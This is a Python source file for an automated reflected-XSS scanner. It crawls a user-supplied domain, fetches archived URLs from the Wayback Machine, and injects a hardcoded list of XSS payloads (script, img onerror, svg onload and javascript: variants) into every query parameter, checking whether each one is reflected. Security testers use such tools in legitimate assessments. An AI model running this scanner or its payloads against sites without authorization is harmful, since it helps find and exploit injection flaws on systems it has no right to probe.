import subprocess
import requests
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from bs4 import BeautifulSoup
import tldextract
import json
import time
from concurrent.futures import ThreadPoolExecutor

# 🎯 Default XSS Payloads
DEFAULT_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>",
    "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
    "';alert('XSS');//",
    "javascript:alert('XSS')",
    "' onfocus='alert(\"XSS\")' autofocus='true",
]

visited_urls = set()
output_results = []
DELAY = 1.0
OUTPUT_FILE = "result.json"

def is_subdomain(url, domain):
    """Check if a URL belongs to the same domain or its subdomains."""
    extracted_main = tldextract.extract(domain)
    extracted_url = tldextract.extract(url)
    return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix

def find_urls(url, domain):
    """Crawl a given URL and return internal links."""
    urls = []
    try:
        headers = {"User-Agent": "Mozilla/5.0 (XSS Scanner)"}
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if is_subdomain(full_url, domain) and full_url not in visited_urls:
                visited_urls.add(full_url)
                urls.append(full_url)
    except Exception as e:
        print(f"❌ Error crawling {url}: {e}")
    return urls

def fetch_wayback_urls(domain):
    """Fetch URLs for a domain from Wayback Machine using WaybackURLs."""
    try:
        print(f"[+] Fetching URLs for domain: {domain} from Wayback Machine...")
        result = subprocess.run(
            ["waybackurls", domain],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if result.returncode != 0:
            print(f"[-] Error fetching URLs: {result.stderr.strip()}")
            return []
        urls = result.stdout.splitlines()
        print(f"[+] Retrieved {len(urls)} URLs from Wayback Machine.")
        return urls
    except FileNotFoundError:
        print("[-] WaybackURLs not found. Install it using: go install github.com/tomnomnom/waybackurls@latest")
        return []

def test_xss(url, payloads):
    """Test XSS payloads on all parameters of a URL."""
    try:
        parsed_url = urlparse(url)
        params = dict(parse_qsl(parsed_url.query))
        headers = {"User-Agent": "Mozilla/5.0 (XSS Scanner)"}

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params)}"

                print(f"🔍 Testing: {test_url}")
                response = requests.get(test_url, headers=headers, timeout=10)

                if payload.lower() in response.text.lower():
                    result = {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "status": "VULNERABLE"
                    }
                    output_results.append(result)
                    print(f"✅ [VULNERABLE] {test_url}")
                    return True
        print(f"🛡️ [SAFE] {url}")
    except Exception as e:
        print(f"❌ Error testing {url}: {e}")
    return False

def crawl_and_test(domain, payloads):
    """Crawl a domain and test for XSS vulnerabilities."""
    print(f"🚀 Starting scan on: {domain}")
    urls_to_test = [domain]

    # Fetch archived URLs from Wayback Machine
    wayback_urls = fetch_wayback_urls(domain)
    urls_to_test.extend(wayback_urls)

    current_depth = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        while urls_to_test:
            current_urls = urls_to_test[:10]
            urls_to_test = urls_to_test[10:]

            crawl_futures = [executor.submit(find_urls, url, domain) for url in current_urls]
            for future in crawl_futures:
                urls_to_test.extend(future.result())

            test_futures = [executor.submit(test_xss, url, payloads) for url in current_urls]
            for future in test_futures:
                future.result()

            time.sleep(DELAY)

    with open(OUTPUT_FILE, 'w') as f:
        json.dump(output_results, f, indent=4)
    print(f"\n📁 Results saved to: {OUTPUT_FILE}")

def menu():
    """Menu-based input system."""
    global DELAY, OUTPUT_FILE

    print("🔍 Welcome to the XSS Scanner")
    domain = input("1. Enter the target domain (e.g., https://example.com): ").strip()

    print("\n2. Choose Payloads:")
    print("   1. Use Default Payloads")
    print("   2. Load from File")
    choice = input("   Enter choice (1 or 2): ").strip()

    if choice == "2":
        payload_file = input("   Enter path to payload file: ").strip()
        try:
            with open(payload_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
            print(f"✅ Loaded {len(payloads)} payloads from {payload_file}")
        except Exception as e:
            print(f"❌ Error loading payload file: {e}")
            payloads = DEFAULT_PAYLOADS
    else:
        payloads = DEFAULT_PAYLOADS
        print("✅ Using default payloads.")

    OUTPUT_FILE = input("\n3. Enter output file name (default: result.json): ").strip() or "result.json"
    DELAY = float(input("\n4. Enter delay between requests (default: 1.0 seconds): ").strip() or "1.0")

    print("\n🚀 Starting XSS Scanner...")
    crawl_and_test(domain, payloads)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\n❌ Interrupted by user.")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
